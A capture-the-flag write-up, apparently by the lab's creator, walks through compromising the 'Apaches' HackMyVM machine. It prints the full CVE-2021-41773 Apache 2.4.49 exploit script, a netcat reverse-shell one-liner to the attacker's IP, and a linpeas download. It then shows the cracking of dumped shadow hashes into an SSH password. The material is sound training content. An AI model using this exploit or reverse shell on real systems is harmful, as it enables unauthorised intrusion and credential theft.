---
title: Write-up Apaches on HackMyVM
author: eMVee
date: 2023-12-25 10:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, RCE, CVE-2021-41773, OSCP, shadow file, jtr, john the ripper, cronjob, plaintext password, nano, sudo]
render_with_liquid: false
---

Some time ago I created a vulnerable machine, Apaches. This machine was created to help beginners get started with hacking. The focus is on enumerating, identifying vulnerabilities and exploiting the found vulnerabilities. The machine is a boot2root machine. It shouldn't take too much effort to pwn the system either. In this write-up I describe how you could hack this machine. If you want to learn something, try hacking this machine yourself first and if you really can't figure it out, you can read this writeup to learn from it.

## Getting started
First things first! Before starting hacking we should create a working directory for this machine. 

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV      

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Apaches

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Apaches   
```
We should verify our own IP address and make a note about it.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 439sec preferred_lft 439sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8e:a8:99:40 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```
Next we should try to identify our target on the (virtual) network. 
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.32

```
The IP address of our target is `10.0.2.32`, we should assign this to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ip=10.0.2.32
```
Let's run a ping request against the target to see if it responds.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ping -c 3 $ip                      
PING 10.0.2.32 (10.0.2.32) 56(84) bytes of data.
64 bytes from 10.0.2.32: icmp_seq=1 ttl=64 time=0.401 ms
64 bytes from 10.0.2.32: icmp_seq=2 ttl=64 time=1.03 ms
64 bytes from 10.0.2.32: icmp_seq=3 ttl=64 time=0.692 ms

--- 10.0.2.32 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2035ms
rtt min/avg/max/mdev = 0.401/0.706/1.025/0.254 ms

```
Based on the ttl value, we can indicate that the machine is running on a Linux operating system.


## Enumeration
It is time to enumerate. We should start enumerating open ports and running services. We can discover those with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-25 11:36 CET
Nmap scan report for 10.0.2.32
Host is up (0.00076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 (RSA)
|   256 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 (ECDSA)
|_  256 46:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apaches
|_http-server-header: Apache/2.4.49 (Unix)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:B2:79:A9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 10.0.2.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds

```
Based on the nmap results we can add the following to our notes.
- Linux, probably an Ubuntu operating system
- Port 22
	- SSH
	- OpenSSH 8.2p1
- Port 80
	- HTTP
	- Apache 2.4.49
	- Title: Apaches

Let's continue with enumerating. We can use whatweb to identify technologies on the website.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ whatweb http://$ip
http://10.0.2.32 [200 OK] Apache[2.4.49], Bootstrap, Country[RESERVED][ZZ], Email[info@apaches.ctf], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[10.0.2.32], JQuery[1.10.2], Lightbox, Script, Title[Apaches]

```
We have found an email address, we should add this to our notes.
- info@apaches.ctf

We can run nikto to see if there are some known vulnerabilities.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ nikto -h $ip 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.32
+ Target Hostname:    10.0.2.32
+ Target Port:        80
+ Start Time:         2023-12-25 11:46:14 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Unix)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.49 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /images/: Directory indexing found.
+ 8909 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-12-25 11:47:14 (GMT1) (60 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                          
```
At the moment we have not found any new information that we can use. So let's view the website in the browser.


![image](/assets/img/WriteUp/HackMyVM/Apaches/Pasted image 20231225115251.png){: width="700" height="400" }

On the top, there is a menu item 'OUR TEAM'. This is interesting for us as attackers.

![image](/assets/img/WriteUp/HackMyVM/Apaches/Pasted image 20231225115350.png){: width="700" height="400" }


On this page we can see four team members. We should add their names to our notes as potential usernames.
- geronimo
- pocahontas
- sacagawea
- squanto

On the contact page we can discover a phone number and an email address. The email address was already added to our notes. Next we should try to see if we can find any vulnerability based on the software and versions we have identified earlier. Let's start with searching for `Apache 2.4.49` in searchsploit.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ searchsploit apache 2.4.49         
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                         | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                       | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                                                                  | multiple/webapps/50383.sh
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                                                       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                                                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                                                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                              | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                              | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                                              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                                          | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There is a path traversal and a remote code execution on Apache 2.4.49 available. We should copy this exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ searchsploit -m 50383     
  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50383
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50383.sh
    Codes: CVE-2021-41773
 Verified: True
File Type: ASCII text
Copied to: /home/emvee/Documents/HMV/Apaches/50383.sh

```
We should always check the code of an exploit before we execute it.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cat 50383.sh     
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami    
```
The exploit is reading a file `targets.txt` what contains an IP addresses. We can create a file with the IP address of our target
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$  echo $ip > targets.txt

┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cat targets.txt 
10.0.2.32
```
Next we try to see if we can execute some commands. We start with the example `whoami` to see if it works.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ./50383.sh targets.txt /bin/sh whoami
./50383.sh: 12: [[: not found
./50383.sh: 12: [[: not found
10.0.2.32
daemon

```
It looks like we are `daemon`, now we can try to gain a reverse shell. First we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...

```

## Initial access
Now we are ready to start a reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ./50383.sh targets.txt /bin/sh 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 1234 >/tmp/f'
./50383.sh: 12: [[: not found
./50383.sh: 12: [[: not found
10.0.2.32

```
Let's check the netcat listener to see if there is a connection established.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.0.2.32: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.32] 36526
/bin/sh: 0: can't access tty; job control turned off

```
A connection has been established. We should first check who we are and on what machine we are working currently.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.0.2.32: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.32] 36526
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ hostname
apaches
$ 

```
We are `daemon` and working on `apaches`. This is our target, we should now upgrade our shell a bit before we continue on this machine.
```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
$ export TERM=xterm-256color  
$ alias ll='ls -lsaht --color=auto'  
$ 
zsh: suspended  rlwrap nc -lvp 1234
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  rlwrap nc -lvp 1234
$ stty columns 200 rows 200
stty: 'standard input': Inappropriate ioctl for device
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@apaches:/usr/bin$ 

```
We should copy linpeas to our project directory on Kali.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cp /usr/share/peass/linpeas/linpeas.sh .

```
Now we can host the file with our python web server.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
On the target we should change the working directory to `/tmp`. This directory is often writeable for anyone. We can download linpeas to this directory and execute the file to automatically enumerate a lot of information.

```bash
daemon@apaches:/usr/bin$ cd /tmp
cd /tmp
daemon@apaches:/tmp$ wget http://10.0.2.15/linpeas.sh
wget http://10.0.2.15/linpeas.sh
--2023-12-25 12:01:58--  http://10.0.2.15/linpeas.sh
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 848317 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 828.43K  --.-KB/s    in 0.007s  

2023-12-25 12:01:58 (114 MB/s) - ‘linpeas.sh’ saved [848317/848317]

daemon@apaches:/tmp$
daemon@apaches:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

```
After making the file an executable we should start linpas.

```bash
daemon@apaches:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

```
We should copy the content of this file into a file on our Kali machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ nano shadow.jtr

┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ cat shadow.jtr                  
root:*:18375:0:99999:7:::                     
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::

```
Now we should use John the Ripper to crack the hashes.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.jtr 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)   
```
Yes! We got our first password (`iamtheone`) for user `squanto`. We can try use these credentials for logon to the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Apaches]
└─$ ssh squanto@$ip               
The authenticity of host '10.0.2.32 (10.0.2.32)' can't be established.
ED25519 key fingerprint is SHA256:Rh8fFW5oIyfLABNlGvG850s8cm8NdtrTuTNfdvGyMuY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.32' (ED25519) to the list of known hosts.
                                                                                
                                                                                
                                                                                
                                                                  
                                                                        >>       >======>         >>           >=>    >=>    >=> >=======>   >=>>=>   
                                                                       >>=>      >=>    >=>      >>=>       >=>   >=> >=>    >=> >=>       >=>    >=> 
                                                                      >> >=>     >=>    >=>     >> >=>     >=>        >=>    >=> >=>        >=>       
                          ~                                          >=>  >=>    >======>      >=>  >=>    >=>        >=====>>=> >=====>      >=>     
                    7~   ~&.                                        >=====>>=>   >=>          >=====>>=>   >=>        >=>    >=> >=>             >=>  
                    G!J !75!   ~G     :                            >=>      >=>  >=>         >=>      >=>   >=>   >=> >=>    >=> >=>       >=>    >=> 
                   ?~:B!. 5Y^!~^B. :~J&                           >=>        >=> >=>        >=>        >=>    >===>   >=>    >=> >=======>   >=>>=>
                 .GG?~    B^...PB?!^ ?5 .                         
                7&G:  7. JB7?7^..   ^&P&Y .7#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!
              .GG.  ~J. ?@5:  :~.  Y@@@@??!?#                     
             :#~  ~Y~  JJ  :77: .J&@#57:  :&!.~Y  .:              
            :&. ^P7  ^J::!7^.:!YJ!:....  Y@@@@@&J5@!              
            @7 Y5  :GP77~::~!~...:^:..:J#&#GPJ!:.PG               
           P@~B# ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             
          ^@@@@@&@#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&              
          &J!7?P#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           
         ?P       :?B@&#@#?7!^^~?55Y7^:..       .^?J5Y^           
         ?B^^^::..    ~G&@#YP#&@B!....::::^~75B&@@@@#G!           
         :&~J?P&@@G?7!^..BG!~7B@#5J7!!7?JPGBB#BB&&@@B^            
         !5 ##J?PY    :JP&    .@&G5JY5GG57^:...   .~YBJ           
        ~5  :P7!^ ..^   ~@P~~~BB7^:.  .:~5G! .:!5B&@G!!.          
       .P      ~PGB#5   P:5!B&7~:Y&#&B&&#GPY7!!?5B@@&G:           
       Y7   ^^ .5GGB!  5~!7:7!G:. 7B7?~^^?G#P!....:GP             
       .~^JJ^   .     .G #..J ##!  J#~..:.  .7P#?^:.              
          !Y:^. ?.    ~Y &  7 PJ!P7^@@&Y!^^.  .J&Y                
           P!         ~P @. : Y&  5GPJ#??~~?#G!!!7.               
           !?       ^?J&.#J   B##: .  B7:.   5^                   
            !!^.:!PP^  !G!&.  5^7?J   ?#:~~^.:B^                  
              .::..!?   .!JG. &^  BG~.:@       .                  
                    JG!!^..5YYG5^ &..~Y&                          
                   .G...^?~  .  JB!    .                          
                   .G!7!:                                   
                   
squanto@10.0.2.32's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 25 Dec 2023 12:12:40 PM UTC

  System load:  0.0                Processes:               127
  Usage of /:   22.6% of 39.07GB   Users logged in:         0
  Memory usage: 16%                IPv4 address for enp0s3: 10.0.2.32
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

143 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

squanto@apaches:~$ 

```
We are logged onto the account of squanto. We should start enumerating again.
Let's start by enumerating the home directory if this user.
```bash
squanto@apaches:~$ ls -la
total 40
drwxr-xr-x 5 squanto squanto 4096 Dec 25 12:12 .
drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc
drwx------ 2 squanto squanto 4096 Dec 25 12:12 .cache
drwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local
-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile
-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt

```
A few interesting details are found in the home directory. Let summarize them:
- Backup directory
- todo.md a task list
- user.txt - a flag

Let's capture the user flag first.
```bash
squanto@apaches:~$ cat user.txt 
  ______ _                      __                               _        
 |  ____| |                    / _|                             | |       
 | |__  | | __ _  __ _    ___ | |_   ___  __ _ _   _  __ _ _ __ | |_ ___  
 |  __| | |/ _` |/ _` |  / _ \|  _| / __|/ _` | | | |/ _` | '_ \| __/ _ \ 
 | |    | | (_| | (_| | | (_) | |   \__ \ (_| | |_| | (_| | | | | || (_) |
 |_|    |_|\__,_|\__, |  \___/|_|   |___/\__, |\__,_|\__,_|_| |_|\__\___/ 
                  __/ |                     | |                           
                 |___/                      |_|                           
@@@@@@@@&@&@@&&@&&&&&&&&&&&&&&&&&&&&&&%&%#%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@&@&@&@&@&&&&&&&&&&&&&&&&&&&&&&&&&&#%%%%&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#(%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&&&@&@&&&&&&&&&&&&&&&&&&&&&&&&&&#((#%#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@&@&&&&&&&&&&&&&&&&&&&&&&&%((//..(*,/,,*.%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@&@@&&&&&&&&&&&&&&&&&&&&&&&##%#(/&&&&&%#//,    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&&&&&&&&&&&&&&&&&((((*&&&%&%%#%((/((  ./&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@&@&&&&&&&&&&&&&&&&%(((//&&&&&#/#(/*//(/(  ..&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@&&&&&&&&&&&&&&&&#(//%%&&*../%(,.*. .(/(  ..&&&&&&&&&&&&&&&&&&&&&&&&&&
